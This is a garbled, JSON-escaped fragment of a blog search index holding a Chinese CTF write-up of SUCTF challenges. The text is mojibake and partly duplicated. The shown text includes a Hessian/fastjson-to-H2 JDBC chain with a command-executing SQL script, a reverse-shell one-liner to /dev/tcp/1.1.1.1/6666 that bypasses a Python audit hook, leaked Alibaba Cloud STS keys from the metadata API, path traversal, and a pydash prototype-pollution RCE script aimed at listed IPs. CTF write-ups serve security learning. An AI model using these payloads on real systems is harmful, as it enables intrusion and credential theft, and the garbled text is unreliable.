\u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ 